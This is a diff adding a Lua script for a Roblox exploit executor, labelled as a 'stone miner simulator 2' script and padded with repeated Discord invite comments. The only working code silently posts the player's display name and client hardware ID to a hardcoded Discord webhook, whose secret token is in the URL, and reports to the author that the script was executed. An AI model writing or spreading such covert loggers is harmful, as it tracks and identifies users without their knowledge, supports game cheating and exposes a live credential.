@@ -1,0 +1,100 @@
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+
+
+HttpService = game:GetService("HttpService")
+Webhook_URL = "https://discord.com/api/webhooks/1027414662335172628/wqmGjbGXcOKUdvqXsAn1ZCO3iOfBmXXB7-Xn3g9uvsYfbpTnPeG5_B-JLkAeY2o5tCmX"
+
+local responce = syn.request(
+{
+    Url = Webhook_URL,
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json',
+        },
+        Body = HttpService:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "**Your script stone miner simulator 2 has been executed**",
+                ["description"] = game.Players.LocalPlayer.DisplayName.." has executed your script.",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xff0000),
+                ["fields"] = {
+                    {
+                        ["name"] = "Hardware ID:",
+                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                        ["inline"] = true
+
+                    }
+                }
+            }}
+        })
+}
+)
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
+--DISCORD https://discord.gg/9qfcnUDxY6 
